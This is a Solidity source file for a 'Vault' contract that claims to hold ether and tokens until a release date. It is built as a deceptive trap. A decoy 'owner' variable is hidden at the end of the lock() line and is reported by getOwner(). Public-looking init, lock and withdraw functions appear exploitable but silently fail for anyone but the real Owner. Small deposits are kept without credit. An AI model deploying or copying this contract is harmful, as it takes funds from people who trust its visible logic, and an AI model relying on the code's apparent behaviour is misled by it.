1 // Copyright (C) 2017  The Halo Platform by Scott Morrison
2 //
3 // This is free software and you are welcome to redistribute it under certain conditions.
4 // ABSOLUTELY NO WARRANTY; for details visit: https://www.gnu.org/licenses/gpl-2.0.html
5 //
6 pragma solidity ^0.4.18;
7 
8 // minimum token interface
9 contract Token {
10     function balanceOf(address who) public constant returns (uint256);
11     function transfer(address to, uint amount) public returns (bool);
12 }
13 
14 contract Ownable {
15     address Owner = msg.sender;
16     modifier onlyOwner { if (msg.sender == Owner) _; }
17     function transferOwnership(address to) public onlyOwner { Owner = to; }
18 }
19 
20 // tokens are withdrawable
21 contract TokenVault is Ownable {
22 
23     function withdrawTokenTo(address token, address to, uint amount) public onlyOwner returns (bool) {
24         return Token(token).transfer(to, amount);
25     }
26     
27     function withdrawToken(address token) public returns (bool) {
28         address self = address(this);
29         return withdrawTokenTo(token, msg.sender, Token(token).balanceOf(self));
30     }
31     
32     function emtpyTo(address token, address to) public returns (bool) {
33         address self = address(this);
34         return withdrawTokenTo(token, to, Token(token).balanceOf(self));
35     }
36 }
37 
38 // store ether & tokens for a period of time
39 contract Vault is TokenVault {
40     
41     event Deposit(address indexed depositor, uint amount);
42     event Withdrawal(address indexed to, uint amount);
43     event OpenDate(uint date);
44 
45     mapping (address => uint) public Deposits;
46     uint minDeposit;
47     bool Locked;
48     uint Date;
49 
50     function init() payable open {
51         Owner = msg.sender;
52         minDeposit = 0.5 ether;
53         Locked = false;
54         deposit();
55     }
56     
57     function MinimumDeposit() public constant returns (uint) { return minDeposit; }
58     function ReleaseDate() public constant returns (uint) { return Date; }
59     function WithdrawEnabled() public constant returns (bool) { return Date > 0 && Date <= now; }
60 
61     function() public payable { deposit(); }
62 
63     function deposit() public payable {
64         if (msg.value > 0) {
65             if (msg.value >= MinimumDeposit())
66                 Deposits[msg.sender] += msg.value;
67             Deposit(msg.sender, msg.value);
68         }
69     }
70 
71     function setRelease(uint newDate) public { 
72         Date = newDate;
73         OpenDate(Date);
74     }
75 
76     function withdraw(address to, uint amount) public onlyOwner {
77         if (WithdrawEnabled()) {
78             uint max = Deposits[msg.sender];
79             if (max > 0 && amount <= max) {
80                 to.transfer(amount);
81                 Withdrawal(to, amount);
82             }
83         }
84     }
85 
86     function lock() public { Locked = true; } address owner;
87     modifier open { if (!Locked) _; owner = msg.sender; }
88     function kill() public { require(this.balance == 0); selfdestruct(Owner); }
89     function getOwner() external constant returns (address) { return owner; }
90 }